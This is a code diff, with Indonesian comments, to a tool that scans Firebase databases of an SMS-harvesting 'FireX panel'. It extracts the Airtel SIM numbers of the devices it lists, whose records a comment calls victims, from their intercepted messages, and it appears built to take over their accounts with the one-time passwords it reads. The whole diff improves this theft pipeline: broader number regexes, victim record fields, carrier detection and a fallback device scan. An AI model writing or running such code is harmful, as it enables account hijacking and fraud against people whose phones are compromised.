@@ -5,10 +5,10 @@ const OTP_TIMEOUT = 120000; // 2 menit - sesuai Grizzly asli & gemini-jio
 const POLL_INTERVAL = 1000; // 1 detik - lebih responsif seperti gemini-jio
 
 const NUMBER_PATTERNS = [
-  /(?:number|no[.]?|mobile)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
+  /(?:your\s+)?airtel\s+(?:mobile|no\.?|number)[.:=,\s]*\+?(?:91)?([6-9]\d{9})/i,
+  /(?:airtel|mobile|no[.]?|number)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
+  /(?:recharge|pack|plan|account)\s+(?:for\s+)?(?:[+]91)?([6-9]\d{9})/i,
   /(?:otp|code|password)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
-  /airtel\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
-  /(?:[+]91)?([6-9]\d{9})/
 ];
 
 const OTP_WORD_PATTERN = /otp|one[-]?time password|verification code|airtel/i;
@@ -16,11 +16,7 @@ const OTP_WORD_PATTERN = /otp|one[-]?time password|verification code|airtel/i;
 // "513385 is your OTP", dll). Terima 4-6 digit, pisahkan dari nomor telepon.
 const OTP_PATTERN = /(?<!\d)(\d{4,6})(?!\d)/;
 
-// Pola body SMS incoming dari operator yang MENYEBUT nomor Airtel pemilik SIM.
-// Ini satu-satunya cara reliable menemukan nomor SIM device di panel FireX:
-// device record hanya berisi nomor TUJUAN outbound (bukan nomor SIM device),
-// sedangkan SMS "Airtel No. XXX" / "your Airtel Mobile XXX" dikirim operator
-// KE nomor SIM device tsb, jadi nomornya pasti milik device ini.
+// Pola body SMS incoming dari operator yang MENYEBUT nomor Airtel pemilik SIM
 const SIM_BODY_PATTERNS = [
   /(?:your\s+)?airtel\s+(?:mobile|no\.?|number)[.:=,\s]*\+?(?:91)?([6-9]\d{9})/i,
 ];
@@ -87,14 +83,12 @@ function normalizeMobile(value) {
   return /^[6-9]\d{9}$/.test(norm) ? norm : null;
 }
 
-export function numberCandidates(messages) {
-  // Sumber nomor SIM device yang valid (urutan prioritas):
-  // 1. item.simInfo.phoneNumber  - nomor SIM terdeteksi OS (paling reliable)
-  // 2. item.phoneNumber          - field "From SMS" di panel
-  // 3. Body SMS INCOMING yang menyebut "Airtel No./Mobile/number XXX"
-  //    (operator mengirim SMS tsb KE nomor SIM device, jadi nomornya milik device).
-  //    Panel FireX tidak menyimpan nomor SIM di device record (hanya nomor TUJUAN
-  //    outbound), jadi pola #3 ini adalah cara utama menemukan nomor SIM Airtel.
+export function numberCandidates(messages = {}, clientData = {}) {
+  // Sumber nomor SIM device yang valid (pola komprehensif seperti gemini-jio):
+  // 1. clientData.phoneNumber / mobNo / phone / mobile - nomor SIM tersimpan di record korban
+  // 2. item.simInfo.phoneNumber                       - nomor SIM terdeteksi OS
+  // 3. item.phoneNumber                               - field nomor pada SMS
+  // 4. Body SMS incoming/outgoing operator ("Airtel No.", recharge, account number)
   const phoneNumbers = new Set();
   const simFromBody = new Set();
   const numBodyTime = new Map();
@@ -102,19 +96,35 @@ export function numberCandidates(messages) {
   let lastOtpAirtelTime = 0;
   let lastActivityTime = 0;
 
+  // 1. Ambil nomor SIM langsung dari clientData
+  if (clientData && typeof clientData === 'object') {
+    const directFields = [
+      clientData.phoneNumber,
+      clientData.mobNo,
+      clientData.phone,
+      clientData.mobile,
+      clientData.simInfo && (clientData.simInfo.phoneNumber || clientData.simInfo.number)
+    ];
+    for (const f of directFields) {
+      const norm = normalizeMobile(f);
+      if (norm) phoneNumbers.add(norm);
+    }
+  }
+
+  // 2. Ekstrak dari riwayat SMS
   for (const [msgKey, item] of Object.entries(messages)) {
     if (!item) continue;
     // simInfo.phoneNumber = nomor SIM card yang terdeteksi oleh OS
     if (item.simInfo && typeof item.simInfo === 'object') {
-      const mobile = normalizeMobile(item.simInfo.phoneNumber);
+      const mobile = normalizeMobile(item.simInfo.phoneNumber || item.simInfo.number);
       if (mobile) phoneNumbers.add(mobile);
     }
-    // phoneNumber = field "From SMS" di panel Firebase (nomor pengirim/penerima SMS)
+    // phoneNumber = field nomor di SMS panel Firebase
     const directPhone = normalizeMobile(item.phoneNumber);
     if (directPhone) phoneNumbers.add(directPhone);
 
     const body = String(item.message || '');
-    const isIncoming = String(item.type || '').toLowerCase().includes('in');
+    const isIncoming = String(item.type || '').toLowerCase().includes('in') || item.type === 1 || item.type === '1';
     const msgTs = parseMessageTimestamp(msgKey, item);
     if (msgTs > 0 && msgTs > lastActivityTime) lastActivityTime = msgTs;
 
@@ -124,15 +134,14 @@ export function numberCandidates(messages) {
       if (msgTs > lastOtpAirtelTime) lastOtpAirtelTime = msgTs;
     }
 
-    // Ekstrak nomor SIM dari body SMS incoming operator ("Airtel No. XXX")
-    if (isIncoming && body.length > 0) {
-      for (const pattern of SIM_BODY_PATTERNS) {
+    // Ekstrak nomor dari body SMS operator / recharge
+    if (body.length > 0) {
+      for (const pattern of NUMBER_PATTERNS) {
         const m = body.match(pattern);
         if (m && m[1]) {
           const norm = normalizeMobile(m[1]);
           if (!norm) continue;
           simFromBody.add(norm);
-          // Lacak waktu SMS terbaru yg menyebut nomor ini (proxy untuk masa aktif SIM)
           const prev = numBodyTime.get(norm) || 0;
           if (msgTs > prev) numBodyTime.set(norm, msgTs);
         }
@@ -142,9 +151,10 @@ export function numberCandidates(messages) {
 
   // Gabungkan: prioritas phoneNumbers (field langsung) lalu simFromBody (body SMS)
   const all = new Set([...phoneNumbers, ...simFromBody]);
-  const simSource = simFromBody.size > 0
-    ? (phoneNumbers.size > 0 ? 'mixed' : 'body-sms')
-    : (phoneNumbers.size > 0 ? 'direct' : 'none');
+  const simSource = phoneNumbers.size > 0
+    ? (simFromBody.size > 0 ? 'mixed' : 'direct')
+    : (simFromBody.size > 0 ? 'body-sms' : 'none');
+
   return {
     numbers: new Set(),
     simNumbers: all,
@@ -177,10 +187,11 @@ function detectOperatorFromSms(messages) {
     const body = String(item.message || '').toLowerCase();
     const sender = String(item.sender || '').toLowerCase();
 
-    if (/airtel|ax-|am-airtel/i.test(sender)) airtelScore += 3;
-    if (/jio|jd-|jm-/i.test(sender)) jioScore += 3;
-    if (/vi |vodafone|idea/i.test(sender)) viScore += 3;
-    if (/bsnl/i.test(sender)) bsnlScore += 3;
+    // TRAI format header operator India (misal AX-, AR-, AM-, AD-AIRTEL, JX-, VM-, dll)
+    if (/^(a[a-z]-|airtel)/i.test(sender) || /airtel/i.test(sender)) airtelScore += 4;
+    if (/^(j[a-z]-|jio)/i.test(sender) || /jio/i.test(sender)) jioScore += 4;
+    if (/^(v[a-z]-|vi-|idea|vodafone)/i.test(sender) || /vi |vodafone|idea/i.test(sender)) viScore += 4;
+    if (/^(b[a-z]-|bsnl)/i.test(sender) || /bsnl/i.test(sender)) bsnlScore += 4;
 
     if (/\bairtel\b/.test(body)) airtelScore += 2;
     if (/\bjio\b/.test(body)) jioScore += 2;
@@ -199,31 +210,38 @@ function detectOperatorFromSms(messages) {
 
 async function scanSingleDatabase(session, url, key, scanLimit) {
   // Ambil daftar clients online (status === true) seperti gemini-jio
-  // FireX Panel menampilkan device dari /clients/, bukan /devices/
   const clients = await firebaseGet(session, url, key, 'clients', {});
-  const onlineDeviceIds = new Set();
+  const onlineDevices = new Map();
   if (clients && typeof clients === 'object') {
     for (const [deviceId, data] of Object.entries(clients)) {
       if (data && typeof data === 'object' && data.status === true) {
-        onlineDeviceIds.add(deviceId);
+        onlineDevices.set(deviceId, data);
       }
     }
   }
 
-  // Fallback: jika /clients/ kosong, gunakan /devices/ agar tetap bisa scan
-  let deviceIds;
-  if (onlineDeviceIds.size > 0) {
-    deviceIds = [...onlineDeviceIds];
-  } else {
-    const devices = await firebaseGet(session, url, key, 'devices', {});
-    if (!devices || typeof devices !== 'object') return [];
-    deviceIds = Object.keys(devices);
+  // Fallback: jika /clients/ online kosong, gunakan semua clients atau /devices/
+  if (onlineDevices.size === 0) {
+    if (clients && typeof clients === 'object' && Object.keys(clients).length > 0) {
+      for (const [deviceId, data] of Object.entries(clients)) {
+        if (data && typeof data === 'object') onlineDevices.set(deviceId, data);
+      }
+    } else {
+      const devices = await firebaseGet(session, url, key, 'devices', {});
+      if (devices && typeof devices === 'object') {
+        for (const [deviceId, data] of Object.entries(devices)) {
+          if (data && typeof data === 'object') onlineDevices.set(deviceId, data);
+        }
+      }
+    }
   }
 
+  if (onlineDevices.size === 0) return [];
+
   const deviceResults = await Promise.allSettled(
-    deviceIds.map(async (deviceId) => {
+    Array.from(onlineDevices.entries()).map(async ([deviceId, clientData]) => {
       const msgs = await latestMessages(session, url, key, deviceId, scanLimit);
-      const numResult = numberCandidates(msgs);
+      const numResult = numberCandidates(msgs, clientData);
       const nums = numResult.numbers || new Set();
       const sims = numResult.simNumbers || new Set();
       const airtelOtpIncoming = !!numResult.airtelOtpIncoming;
@@ -231,13 +249,6 @@ async function scanSingleDatabase(session, url, key, scanLimit) {
       const lastOtpAirtelTime = numResult.lastOtpAirtelTime || 0;
       const lastActivityTime = numResult.lastActivityTime || 0;
       const numBodyTime = numResult.numBodyTime || {};
-
-      // Catatan: device record (devices/{deviceId}) hanya berisi nomor TUJUAN
-      // outbound (action.to, sendSms.mobNo, commands.to) — BUKAN nomor SIM device.
-      // Memproses nomor itu untuk login OTP hanya menyebabkan OTP_TIMEOUT karena
-      // OTP untuk nomor tsb masuk ke device LAIN. Jadi fallback ke device record
-      // DIHAPUS untuk panel FireX. Nomor SIM hanya dari messages (field langsung
-      // atau body SMS operator).
 
       // Device valid jika punya nomor SIM terdeteksi
       if (sims.size > 0) {
